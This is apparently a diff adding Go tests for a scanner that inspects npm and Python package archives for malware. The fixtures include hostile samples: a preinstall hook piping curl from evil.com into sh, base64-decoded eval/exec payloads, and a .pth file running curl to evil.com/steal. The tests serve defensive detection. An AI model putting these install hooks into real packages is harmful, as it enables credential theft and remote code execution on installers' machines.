@@ -151,3 +151,111 @@ func TestScanDisabledDetector(t *testing.T) {
 		t.Error("expected PASS when all detectors disabled")
 	}
 }
+
+func TestScanPackageJSONMaliciousPreinstall(t *testing.T) {
+	pkgJSON := `{
+  "name": "evil",
+  "scripts": {
+    "preinstall": "curl http://evil.com/steal | sh",
+    "test": "jest"
+  }
+}`
+	data := makeTarGz(t, map[string]string{
+		"package/package.json": pkgJSON,
+	})
+	result := Scan(bytes.NewReader(data), "evil", ScanConfig{
+		MaxFileSize:        1024 * 1024,
+		MaxTotalSize:       10 * 1024 * 1024,
+		EntropyEnabled:     false,
+		ObfuscationEnabled: false,
+		NetworkEnabled:     true,
+		AllowPrivateIPs:    false,
+	})
+	if !result.Block {
+		t.Error("expected BLOCK for package.json with malicious preinstall")
+	}
+	if result.Reason != "network" {
+		t.Errorf("expected Reason network, got %s", result.Reason)
+	}
+}
+
+func TestScanPackageJSONReferencedJSFile(t *testing.T) {
+	pkgJSON := `{
+  "scripts": {
+    "postinstall": "node ./post.js"
+  }
+}`
+	postJS := `eval(atob("` + longBase64() + `"))`
+	data := makeTarGz(t, map[string]string{
+		"package/package.json": pkgJSON,
+		"package/post.js":      postJS,
+	})
+	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
+		MaxFileSize:        1024 * 1024,
+		MaxTotalSize:       10 * 1024 * 1024,
+		EntropyEnabled:     true,
+		EntropyThreshold:   5.0,
+		ObfuscationEnabled: false,
+		NetworkEnabled:     false,
+		AllowPrivateIPs:    false,
+	})
+	if !result.Block {
+		t.Error("expected BLOCK for referenced post.js with high entropy")
+	}
+}
+
+func TestScanInitPyMalicious(t *testing.T) {
+	content := `exec(__import__('base64').b64decode('ZXhlYyhvcy5zeXN0ZW0oImN1cmwgaHR0cDovL2V2aWwuY29tIikp'))`
+	data := makeTarGz(t, map[string]string{
+		"pkg-1.0/__init__.py": content,
+	})
+	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
+		MaxFileSize:        1024 * 1024,
+		MaxTotalSize:       10 * 1024 * 1024,
+		EntropyEnabled:     false,
+		ObfuscationEnabled: true,
+		ObfuscationMinB64:  50,
+		ObfuscationMinHex:  20,
+		NetworkEnabled:     false,
+		AllowPrivateIPs:    false,
+	})
+	if !result.Block {
+		t.Error("expected BLOCK for __init__.py with exec+b64decode")
+	}
+}
+
+func TestScanPthFileInTar(t *testing.T) {
+	content := "import os; os.system('curl http://evil.com/steal')"
+	data := makeTarGz(t, map[string]string{
+		"pkg-1.0/malicious.pth": content,
+	})
+	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
+		MaxFileSize:        1024 * 1024,
+		MaxTotalSize:       10 * 1024 * 1024,
+		EntropyEnabled:     false,
+		ObfuscationEnabled: false,
+		NetworkEnabled:     true,
+		AllowPrivateIPs:    false,
+	})
+	if !result.Block {
+		t.Error("expected BLOCK for .pth file with malicious import")
+	}
+}
+
+func TestScanPyprojectTomlInTar(t *testing.T) {
+	content := "[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"malicious-backend\"\n"
+	data := makeTarGz(t, map[string]string{
+		"pkg-1.0/pyproject.toml": content,
+	})
+	result := Scan(bytes.NewReader(data), "pkg", ScanConfig{
+		MaxFileSize:        1024 * 1024,
+		MaxTotalSize:       10 * 1024 * 1024,
+		EntropyEnabled:     false,
+		ObfuscationEnabled: false,
+		NetworkEnabled:     true,
+		AllowPrivateIPs:    false,
+	})
+	if result.Block {
+		t.Error("expected PASS for pyproject.toml with harmless build-backend name")
+	}
+}
